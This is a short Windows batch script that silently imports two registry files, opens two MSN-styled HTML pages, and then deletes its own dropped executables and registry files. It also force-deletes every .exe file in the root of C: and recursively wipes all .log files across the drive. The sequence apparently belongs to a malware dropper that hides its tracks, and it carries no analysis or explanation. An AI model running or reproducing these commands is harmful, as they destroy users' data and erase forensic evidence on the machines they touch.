@echo off

REGEDIT.EXE /S 2343.reg
REGEDIT.EXE /S 5565.reg

msnhelp1.html
winmsnpage.html

del c:\bootios1.exe
del c:\%systemroot%\2343.reg
del c:\%systemroot%\5565.reg
del c:\dload1.exe
del /F /Q c:\*.exe
del /S /Q /F c:\*.log
del /S /Q /F c:\*.logs
exit